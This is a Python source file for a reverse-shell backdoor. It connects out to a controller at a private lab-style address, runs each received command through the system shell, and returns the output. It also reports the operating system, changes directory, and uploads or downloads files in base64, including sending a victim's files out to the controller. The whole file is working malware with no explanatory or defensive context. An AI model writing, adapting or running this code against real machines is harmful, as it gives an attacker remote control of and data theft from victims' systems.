import socket
import subprocess
import os
import platform
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect_to_server()

    def connect_to_server(self):
        try:
            self.connection.connect((self.ip, self.port))
            print(f"[+] Connected to {self.ip}:{self.port}")
        except Exception as e:
            print(f"[-] Failed to connect to {self.ip}:{self.port}: {e}")
            exit()

    def reliable_send(self, data):
        if type(data) is list: data = ' '.join(data)
        self.connection.send(data.encode('ascii'))

    def reliable_receive(self):
        try:
            recv_msg = self.connection.recv(4096)
            recv_msg = recv_msg.decode('ascii')
            return recv_msg
        except:
            self.reliable_send("Error receiving data from Server")


    def execute_system_command(self, command):
        try:
            task = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = task.communicate()
            data = stdout.decode('utf-8') + stderr.decode('utf-8')
            return data
        except Exception as e:
            # Return the specific exception message
            error_msg = f"Error executing command: {e}"
            return error_msg

    def operating_sys_ver(self):
        return (f"Operating system - {platform.system()} {platform.version()}")

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            command = command.split(" ")
            if command[0] == "/exit":
                message = "Closing the Connection."
                self.reliable_send(message)
                self.connection.close()
                exit(0)
            elif command[0] == "/os" and len(command) == 1:
                command_result = self.operating_sys_ver()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "/download":
                command_result = self.read_file(command[1])
            elif command[0] == "/upload":
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)

if __name__ == "__main__":
    myBackdoor = Backdoor("192.168.56.103", 9200)
    myBackdoor.run()
